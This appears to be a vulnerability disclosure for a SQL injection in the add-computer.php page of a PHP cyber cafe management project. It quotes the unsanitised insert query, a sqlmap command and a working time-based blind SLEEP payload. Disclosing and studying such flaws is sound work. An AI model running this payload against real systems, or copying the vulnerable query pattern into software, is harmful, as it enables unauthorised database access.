# SQLi vulnerability in Cyber Cafe Management System Project v1.0 of file /admin/add-computer.php

**vender**:

[PHP Project, PHP Projects Ideas, PHP Latest tutorials, PHP oops Concept](https://phpgurukul.com/)

[Cyber Cafe Management System Using PHP & MySQL , Cyber Cafe Management System Project](https://phpgurukul.com/cyber-cafe-management-system-using-php-mysql/)

**SoftLink**:

[Cyber Cafe Management System Using PHP & MySQL , Cyber Cafe Management System Project](https://phpgurukul.com/cyber-cafe-management-system-using-php-mysql/)

**Vulnerable File**

- /admin/add-computer.php

**Version**

- V1.0

### Analyse

`ccms\add-computer.php:12-16`

```php
$compname=$_POST['compname'];
$comploc=$_POST['comploc'];
$idadd=$_POST['idadd'];

 $query=mysqli_query($con,"insert into tblcomputers(ComputerName,ComputerLocation,IPAdd) value('$compname','$comploc','$idadd')");
```

- **参数**: `compname`, `comploc`, `idadd` (POST)

### POC

```bash
sqlmap -u "http://192.168.93.1/ccms/add-computer.php" --data="compname=admin&comploc=admin&submit=Add" --cookie="PHPSESSID=q8vu4tgrhj01ikmjm3u469chil" --dbms=mysql --level=2
```



```bash
---
Parameter: compname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 RLIKE time-based blind
    Payload: compname=admin' RLIKE SLEEP(5) AND 'CVVo'='CVVo&comploc=admin&submit=Add
---
```



![image-20251212113806710](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202512121138773.png)